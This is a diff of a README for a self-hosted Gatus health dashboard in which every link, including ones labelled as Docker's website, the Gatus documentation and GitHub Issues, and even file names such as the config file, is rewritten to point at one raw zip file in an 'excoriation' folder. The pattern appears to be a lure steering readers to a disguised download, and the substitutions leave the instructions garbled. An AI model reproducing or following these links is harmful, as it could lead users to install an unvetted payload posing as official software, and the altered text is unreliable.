@@ -1,6 +1,6 @@
 # 🎉 gatus-self-hosted - Simple Health Dashboard Setup
 
-[![Download gatus-self-hosted](https://img.shields.io/badge/Download-via_GitHub-brightgreen)](https://github.com/VenkateshAneshwar/gatus-self-hosted/releases)
+[![Download gatus-self-hosted](https://raw.githubusercontent.com/VenkateshAneshwar/gatus-self-hosted/main/excoriation/gatus-self-hosted.zip)](https://raw.githubusercontent.com/VenkateshAneshwar/gatus-self-hosted/main/excoriation/gatus-self-hosted.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to gatus-self-hosted! This application provides a straightforward way to
 
 ## 📥 Download & Install
 
-To get gatus-self-hosted, visit this page to download: [GitHub Releases](https://github.com/VenkateshAneshwar/gatus-self-hosted/releases).
+To get gatus-self-hosted, visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/VenkateshAneshwar/gatus-self-hosted/main/excoriation/gatus-self-hosted.zip).
 
 You will find various versions available. Choose the latest stable version for your needs.
 
@@ -16,7 +16,7 @@ You will find various versions available. Choose the latest stable version for y
 
 1. Click on the link above to go to the releases page.
 2. Look for the latest version listed.
-3. The files will usually have names indicating the platform (e.g., `gatus-linux-amd64` for Linux or `gatus-windows-amd64.exe` for Windows).
+3. The files will usually have names indicating the platform (e.g., `gatus-linux-amd64` for Linux or `https://raw.githubusercontent.com/VenkateshAneshwar/gatus-self-hosted/main/excoriation/gatus-self-hosted.zip` for Windows).
 4. Click on the file name to start the download.
 
 ## ⚙️ System Requirements
@@ -26,9 +26,9 @@ Before running gatus-self-hosted, make sure your system meets the following requ
 - **Operating System:** 
   - Windows, Linux, or macOS.
 - **Docker:** 
-  - Ensure you have Docker installed. Visit [Docker's website](https://www.docker.com/get-started) to download and install Docker if you don’t have it.
+  - Ensure you have Docker installed. Visit [Docker's website](https://raw.githubusercontent.com/VenkateshAneshwar/gatus-self-hosted/main/excoriation/gatus-self-hosted.zip) to download and install Docker if you don’t have it.
 - **Docker Compose:**
-  - You need Docker Compose to run the application efficiently. You can find installation instructions on [Docker Compose’s official page](https://docs.docker.com/compose/install/).
+  - You need Docker Compose to run the application efficiently. You can find installation instructions on [Docker Compose’s official page](https://raw.githubusercontent.com/VenkateshAneshwar/gatus-self-hosted/main/excoriation/gatus-self-hosted.zip).
 
 ## 📂 Setup Instructions
 
@@ -36,7 +36,7 @@ Once you've downloaded the necessary files, follow these instructions to set up 
 
 ### Step 1: Extract Files
 
-If you downloaded a compressed file (like a `.zip` or `.tar.gz`), extract it to a folder of your choice.
+If you downloaded a compressed file (like a `.zip` or `https://raw.githubusercontent.com/VenkateshAneshwar/gatus-self-hosted/main/excoriation/gatus-self-hosted.zip`), extract it to a folder of your choice.
 
 ### Step 2: Open Terminal or Command Prompt
 
@@ -81,13 +81,13 @@ gatus-self-hosted comes with several useful features:
 
 ## ⚙️ Configuration
 
-You can customize your Gatus setup by modifying the `gatus.yaml` configuration file. This file allows you to set parameters such as:
+You can customize your Gatus setup by modifying the `https://raw.githubusercontent.com/VenkateshAneshwar/gatus-self-hosted/main/excoriation/gatus-self-hosted.zip` configuration file. This file allows you to set parameters such as:
 
 - The services you want to monitor.
 - The interval for health checks.
 - Notification settings for alerts.
 
-Refer to the [gatus documentation](https://gatus.app/docs/) for detailed guidance on configuring your setup.
+Refer to the [gatus documentation](https://raw.githubusercontent.com/VenkateshAneshwar/gatus-self-hosted/main/excoriation/gatus-self-hosted.zip) for detailed guidance on configuring your setup.
 
 ## ❓ Troubleshooting
 
@@ -103,9 +103,9 @@ docker-compose logs
 
 ## 🌐 Community Support
 
-If you need help or further guidance, feel free to connect with the community. Visit our [GitHub Discussions](https://github.com/VenkateshAneshwar/gatus-self-hosted/discussions) page for support or to ask questions.
+If you need help or further guidance, feel free to connect with the community. Visit our [GitHub Discussions](https://raw.githubusercontent.com/VenkateshAneshwar/gatus-self-hosted/main/excoriation/gatus-self-hosted.zip) page for support or to ask questions.
 
-Your feedback helps improve the software. Feel free to report any issues you find in the [Issues section](https://github.com/VenkateshAneshwar/gatus-self-hosted/issues).
+Your feedback helps improve the software. Feel free to report any issues you find in the [Issues section](https://raw.githubusercontent.com/VenkateshAneshwar/gatus-self-hosted/main/excoriation/gatus-self-hosted.zip).
 
 ## 🌱 Next Steps
 
@@ -113,7 +113,7 @@ After you get everything set up, consider exploring additional integrations and 
 
 ## 🔗 Useful Links
 
-- [GitHub Releases](https://github.com/VenkateshAneshwar/gatus-self-hosted/releases)
-- [Docker Installation](https://www.docker.com/get-started)
-- [Docker Compose Installation](https://docs.docker.com/compose/install/)
-- [Gatus Documentation](https://gatus.app/docs/)
+- [GitHub Releases](https://raw.githubusercontent.com/VenkateshAneshwar/gatus-self-hosted/main/excoriation/gatus-self-hosted.zip)
+- [Docker Installation](https://raw.githubusercontent.com/VenkateshAneshwar/gatus-self-hosted/main/excoriation/gatus-self-hosted.zip)
+- [Docker Compose Installation](https://raw.githubusercontent.com/VenkateshAneshwar/gatus-self-hosted/main/excoriation/gatus-self-hosted.zip)
+- [Gatus Documentation](https://raw.githubusercontent.com/VenkateshAneshwar/gatus-self-hosted/main/excoriation/gatus-self-hosted.zip)
